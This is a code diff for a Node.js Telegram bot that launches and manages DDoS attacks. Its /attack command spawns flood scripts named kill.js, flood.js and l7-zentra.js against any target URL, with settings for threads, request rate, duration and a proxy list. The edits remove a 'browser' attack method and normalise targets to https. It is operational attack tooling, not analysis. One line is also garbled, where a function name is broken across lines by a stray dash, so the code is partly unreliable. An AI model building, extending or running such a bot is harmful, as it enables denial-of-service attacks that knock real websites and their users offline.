@@ -89,12 +89,14 @@ bot.onText(/\/methods/, async (msg) => {
 
   if (!isAdmin && !isGroupActive) return
 
-  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra, browser')
+  bot.sendMessage(chatId, 'Available methods: kill, flood, zentra')
 })
 
 bot.onText(/\/bot\s+(on|off)/, async (msg, match) => {
   const chatId = msg.chat.id
-  const admins = await loadJson(ADMIN_LIST_PATH)
+  const admins = await load—
+
+Json(ADMIN_LIST_PATH)
   const isAdmin = Object.keys(admins).includes(String(msg.from.id))
 
   if (!isAdmin) {
@@ -126,25 +128,36 @@ bot.on('message', async (msg) => {
 
   if (text.startsWith('/attack')) {
     const args = text.split(/\s+/).slice(1)
-    const [method, target, timeStr, threadsStr, proxyFile, rateStr, floodModeStr] = args
+    let [method, target, timeStr, threadsStr, proxyFile, rateStr] = args
     const time = parseInt(timeStr) || 60
     const threads = parseInt(threadsStr) || 15
     const proxy = proxyFile || './prx.txt'
     const rate = parseInt(rateStr) || 20
-    const floodMode = floodModeStr !== 'false'
 
-    if (args.length < 2 || (method === 'browser' && args.length < 3)) {
-      bot.sendMessage(id, 'Usage: /attack [method] [target] [time] [threads] [proxyfile] [rate] [flood_mode]')
+    // Chuẩn hóa URL
+    if (!target) {
+      bot.sendMessage(id, 'Target URL is required')
+      return
+    }
+    if (!target.startsWith('http://') && !target.startsWith('https://')) {
+      target = `https://${target}`
+    }
+    if (target.startsWith('http://')) {
+      target = target.replace('http://', 'https://')
+    }
+
+    if (args.length < 2) {
+      bot.sendMessage(id, 'Usage: /attack [method] [target] [time] [threads] [proxyfile] [rate]')
       return
     }
 
-    if (!['kill', 'flood', 'zentra', 'browser'].includes(method)) {
-      bot.sendMessage(id, 'Method must be "kill", "flood", "zentra", or "browser".')
+    if (!['kill', 'flood', 'zentra'].includes(method)) {
+      bot.sendMessage(id, 'Method must be "kill", "flood", or "zentra".')
       return
     }
 
-    if (!target || isNaN(time)) {
-      bot.sendMessage(id, 'Invalid arguments')
+    if (isNaN(time)) {
+      bot.sendMessage(id, 'Invalid time argument')
       return
     }
 
@@ -164,11 +177,11 @@ bot.on('message', async (msg) => {
       return
     }
 
-    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : method === 'zentra' ? './l7-zentra.js' : './browser.js'
-    const cmdArgs = method === 'browser' ? [scriptFile, target, String(threads), proxy, String(rate), String(floodMode)] : [scriptFile, target, time, rate, threads, proxy]
+    const scriptFile = method === 'kill' ? './kill.js' : method === 'flood' ? './flood.js' : './l7-zentra.js'
+    const cmdArgs = [scriptFile, target, time, rate, threads, proxy]
     const cmd = spawn('node', cmdArgs, { stdio: ['ignore', 'pipe', 'pipe'] })
     const attackId = `${userId}_${Date.now()}`
-    activeAttacks[attackId] = { cmd, target, time, rate, threads, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now(), method, floodMode: method === 'browser' ? floodMode : undefined }
+    activeAttacks[attackId] = { cmd, target, time, rate, threads, proxy, userId, remainingTime: time, messageId: null, startTime: Date.now(), method }
 
     const response = {
       status: 'Attack Started',
@@ -178,7 +191,6 @@ bot.on('message', async (msg) => {
       rate,
       threads,
       proxy,
-      floodMode: method === 'browser' ? floodMode : undefined,
       caller: username,
       index: attackId
     }
@@ -218,7 +230,6 @@ bot.on('message', async (msg) => {
         rate,
         threads,
         proxy,
-        floodMode: method === 'browser' ? floodMode : undefined,
         caller: username,
         index: attackId
       }
@@ -278,8 +289,7 @@ bot.on('message', async (msg) => {
         time: v.remainingTime,
         rate: v.rate,
         threads: v.threads,
-        proxy: v.proxy,
-        floodMode: v.floodMode
+        proxy: v.proxy
       }))
     bot.sendMessage(id, '```json\n' + JSON.stringify(list, null, 2) + '\n```', { parse_mode: 'Markdown' })
   }
